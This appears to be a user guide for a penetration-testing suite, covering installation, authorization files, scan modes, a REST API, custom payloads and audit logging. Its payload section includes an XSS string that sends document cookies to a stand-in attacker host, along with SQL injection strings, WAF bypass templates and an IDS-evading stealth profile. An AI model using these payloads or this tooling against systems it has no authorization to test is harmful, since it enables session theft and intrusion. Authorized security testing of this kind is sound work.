# Athena Security Suite – User Guide

> Step-by-step guide for installation, configuration, running scans, and reviewing results.

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Installation](#2-installation)
3. [Environment Configuration](#3-environment-configuration)
4. [Authorization Setup](#4-authorization-setup)
5. [Running CLI Scans](#5-running-cli-scans)
6. [REST API Server](#6-rest-api-server)
7. [Custom Payload Configuration](#7-custom-payload-configuration)
8. [Reading Reports](#8-reading-reports)
9. [Compliance Logging](#9-compliance-logging)
10. [Troubleshooting](#10-troubleshooting)
11. [Operational Profiles](#11-operational-profiles)
12. [HTTPS Setup (Production)](#12-https-setup-production)

---

## 1. Prerequisites

| Requirement | Minimum version |
|---|---|
| Python | 3.10 |
| pip | 23.0 |
| OS | Windows 10 / Ubuntu 22.04 / macOS 13 |

Optional (for full HTTPS support without ad-hoc TLS):
```
pip install pyOpenSSL
```

---

## 2. Installation

```powershell
# Windows PowerShell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
```

```bash
# Linux / macOS
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Verify installation:
```powershell
python athena.py --help
```

---

## 3. Environment Configuration

Copy the example file and edit it:

```powershell
Copy-Item .env.example .env
notepad .env    # or your preferred editor
```

**Minimum required settings:**

```env
# A strong random API key (at least 32 characters)
ATHENA_API_KEY=your-very-long-random-api-key-here

# Safety: never disable unless running an explicitly authorised destructive test
ATHENA_SAFE_MODE=true

# Operational profile
ATHENA_PROFILE=balanced
```

**Generate a secure API key:**
```powershell
python -c "import secrets; print(secrets.token_urlsafe(48))"
```

---

## 4. Authorization Setup

Certain features (credential bruteforcing, aggressive exploitation) require explicit authorization.

**Option A – Environment variable (recommended for scripted environments):**
```powershell
$env:ATHENA_AUTH = "1"     # Windows
export ATHENA_AUTH=1        # Linux/macOS
```

**Option B – Authorization file (required for interactive sessions):**

Create `ATHENA_AUTHORIZATION.txt` in the project directory:
```
ATHENA-AUTHORIZED
Target: example.com
Scope: Full penetration test
Issued: 2026-04-19
Authorized by: [Engagement Manager Name]
```

> **Important:** The file must be created or modified within the last hour. Older files are automatically rejected.

---

## 5. Running CLI Scans

### Full assessment (recommended)

```powershell
# Single target
python athena.py --target example.com --mode 1

# Multiple targets (comma-separated)
python athena.py --target "site1.com,site2.com,api.example.com" --mode 1

# Without safe mode (requires authorization)
python athena.py --target example.com --mode 1 --unsafe
```

### Discovery only

Maps subdomains, live URLs, and technologies without probing for vulnerabilities:

```powershell
python athena.py --target example.com --mode 2
```

### Aggressive directory/file enumeration

Discovery now runs a full wordlist-driven enumerator (1200+ bundled entries in
`config/directories.txt`) that fuzzes extension variants (`.txt`, `.php`, `.zip`,
`.bak`, `~`, ...), harvests paths from `robots.txt`/sitemaps, filters soft-404s,
and can recurse into confirmed directories:

```powershell
# Built-in wordlist, no recursion
python athena.py --target example.com --mode 2

# Custom wordlist + 2 levels of recursion into found directories
python athena.py --target example.com --mode 2 --wordlist mylist.txt --dir-depth 2

# Custom wordlist format: one path per line, '#' comments, leading '/' optional
```

Confirmed paths (including `files.txt`, `robots.txt`, `admin.txt`,
`passwords.txt`, backups, `.env`, git exposure, phpinfo, login forms, etc.) are
reported and fed to the vulnerability scan stage.

### Vulnerability scan only

Probes for vulnerabilities but skips exploitation:

```powershell
python athena.py --target example.com --mode 3
```

### Output

Each scan produces:
- `report_<target>.json` – Machine-readable JSON results
- `athena.log` – Detailed operational log
- `athena_audit.log` – Compliance audit trail (JSON-L format)

---

## 6. REST API Server

### Start the server

```powershell
# With HTTPS (default – requires cert.pem + key.pem)
python athena.py --api

# HTTP only (dev/testing)
# Set HTTPS_ENABLED=false in .env first
python athena.py --api

# Disable safe mode (authorised environments only)
python athena.py --api --unsafe
```

### Test connectivity

```powershell
# Health check (no auth required)
Invoke-RestMethod https://localhost:5000/health -SkipCertificateCheck

# Swagger UI (open in browser)
Start-Process "https://localhost:5000/apidocs/"
```

### Queue a scan via API

```powershell
$headers = @{
    "X-API-KEY" = "your-api-key"
    "Content-Type" = "application/json"
}
$body = '{"target": "example.com", "mode": "1"}'

$resp = Invoke-RestMethod `
    -Uri https://localhost:5000/scan `
    -Method POST `
    -Headers $headers `
    -Body $body `
    -SkipCertificateCheck

$jobId = $resp.job_id
Write-Host "Job ID: $jobId"

# Poll for completion
do {
    Start-Sleep -Seconds 10
    $status = Invoke-RestMethod `
        -Uri "https://localhost:5000/scan/status/$jobId" `
        -Headers $headers `
        -SkipCertificateCheck
    Write-Host "Status: $($status.status)"
} while ($status.status -in @("QUEUED", "RUNNING"))
```

---

## 7. Custom Payload Configuration

### Using the built-in payload manager

```python
from modules.payload_manager import payload_manager

# List available categories
print(payload_manager.list_categories())
# → ['AUTH_BYPASS', 'COMMAND_INJECTION', 'FILE_INCLUSION', 'HEADER_INJECTION',
#    'OPEN_REDIRECT', 'SQL_INJECTION', 'SSRF', 'XSS', 'XXE']

# Get payloads for a specific category and profile
sqli_time = payload_manager.get_payloads('SQL_INJECTION', profile='time_based')

# Register a custom payload at runtime
payload_manager.register_payload(
    'XSS',
    "<svg/onload=fetch('//attacker.com/?c='+document.cookie)>",
    metadata={'author': 'red-team', 'engagement': '2026-Q2'},
)
```

### Loading from a custom JSON file

Create `my_payloads.json`:
```json
{
  "SQL_INJECTION": {
    "custom": [
      "' AND (SELECT 1 FROM (SELECT SLEEP(5))a) --",
      "' UNION SELECT @@version,2,3 --"
    ]
  },
  "XSS": {
    "custom": ["<svg id=x tabindex=1 onfocus=alert(1)>"]
  }
}
```

Load it:
```python
count = payload_manager.load_custom_payloads('my_payloads.json')
print(f'Loaded {count} custom payloads')
```

### Extending `config/payloads.json`

The `config/payloads.json` file contains WAF bypass techniques and test templates.
Add entries following the existing structure:

```json
{
  "WAF_BYPASS_TECHNIQUES": {
    "SQL_INJECTION": {
      "your_technique": ["payload1", "payload2"]
    }
  },
  "PAYLOAD_TEMPLATES": {
    "SQL_INJECTION_TEST": {
      "your_profile": "your_payload"
    }
  }
}
```

---

## 8. Reading Reports

### JSON report structure

```json
{
  "target": "example.com",
  "timestamp": "2026-04-19T00:00:00+00:00",
  "safe_mode": true,
  "discovery": {
    "subdomains": ["api.example.com", "mail.example.com"],
    "urls": [...],
    "technologies": ["WordPress", "PHP/8.1"]
  },
  "vulnerabilities": [
    {
      "type": "SQL Injection (Error-Based)",
      "severity": "CRITICAL",
      "url": "https://example.com/api?id=1",
      "payload": "' OR '1'='1",
      "description": "Error-based SQL injection detected"
    }
  ],
  "exploitation": [...],
  "bruteforce": [...]
}
```

### Severity levels

| Severity | Meaning | Typical examples |
|---|---|---|
| CRITICAL | Immediate risk of compromise | SQL injection, RCE, LFI |
| HIGH | Significant impact if exploited | XSS, SSRF, IDOR, open API |
| MEDIUM | Moderate impact or requires chaining | Missing headers, CSRF |
| LOW | Minor misconfiguration | Version disclosure |

---

## 9. Compliance Logging

### Audit log format

Every compliance event is written to `athena_audit.log` as a single-line JSON object:

```json
{"event_type": "SECURITY_ACTION", "timestamp": "2026-04-19T00:00:00+00:00",
 "user": "192.168.1.100", "action": "SCAN_START", "target": "example.com",
 "status": "INITIATED", "details": "Full penetration test started"}
```

### Reading audit logs

```powershell
# View last 20 audit events (pretty-printed)
Get-Content athena_audit.log -Tail 20 | ForEach-Object { $_ | ConvertFrom-Json | ConvertTo-Json }

# Filter GDPR data access events
Get-Content athena_audit.log | Where-Object { $_ -like '*GDPR_DATA_ACCESS*' }

# Filter PCI DSS events
Get-Content athena_audit.log | Where-Object { $_ -like '*PCI_DSS_REQ10*' }
```

### Programmatic audit logging

```python
from modules.logging_config import audit_logger

# Record a GDPR data access event
audit_logger.log_data_access(
    user='scanner-1',
    data_type='PII',
    target='users_db',
    legal_basis='legitimate_interests',
    purpose='security vulnerability assessment',
)

# Record a PCI DSS event
audit_logger.log_pci_event(
    actor='pentest-01',
    card_system='payment_api',
    action='READ',
    outcome='SUCCESS',
    details='accessed card processing endpoint during authorised assessment',
)
```

---

## 10. Troubleshooting

### `AttributeError: 'VulnerabilityScanner' has no attribute 'rate_limiter'`

This was a known bug fixed in v2.2.0. Ensure you are on the latest version:
```powershell
git pull origin main
```

### `503 Service Unavailable – ATHENA_API_KEY is not configured`

Set `ATHENA_API_KEY` in your `.env` file and restart the server.

### SSL certificate errors in dev

Use `--skip-cert-verify` in your HTTP client, or set `HTTPS_ENABLED=false` in `.env` for local development.

Generate self-signed certs:
```powershell
python -c "
from OpenSSL import crypto
key = crypto.PKey(); key.generate_key(crypto.TYPE_RSA, 4096)
cert = crypto.X509(); cert.get_subject().CN = 'localhost'
cert.set_serial_number(1); cert.gmtime_adj_notBefore(0); cert.gmtime_adj_notAfter(365*24*60*60)
cert.set_issuer(cert.get_subject()); cert.set_pubkey(key); cert.sign(key, 'sha256')
open('cert.pem','wb').write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
open('key.pem','wb').write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
print('cert.pem and key.pem generated')
"
```

### Test failures: `aioresponses` not installed

```powershell
pip install aioresponses
```

### Authorization file rejected (too old)

Recreate the file – it must have been modified within the last hour:
```powershell
Set-Content ATHENA_AUTHORIZATION.txt "ATHENA-AUTHORIZED`nIssued: $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
```

---

## 11. Operational Profiles

Set `ATHENA_PROFILE` in `.env` or pass programmatically:

| Profile | Speed | Stealth | Use case |
|---|---|---|---|
| `stealth` | Slow | Maximum | Red team engagements, evading IDS |
| `balanced` | Moderate | Good | General assessments (default) |
| `aggressive` | Fast | Minimal | CTF, lab environments, time-constrained tests |
| `debug` | Slow | None | Development and troubleshooting |

Switch profile at runtime:
```python
from modules.framework_config import load_config
load_config('aggressive')
```

---

## 12. HTTPS Setup (Production)

For production deployments, use a real certificate from a trusted CA (Let's Encrypt, internal PKI, etc.):

```
cert.pem  ← Full certificate chain
key.pem   ← Private key (keep secret, never commit)
```

Place them in the project root, then set in `.env`:
```env
HTTPS_ENABLED=true
SSL_CERT=cert.pem
SSL_KEY=key.pem
```

For production traffic volumes, run Athena behind a production WSGI server:
```powershell
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:5000 --certfile cert.pem --keyfile key.pem "athena:app"
```
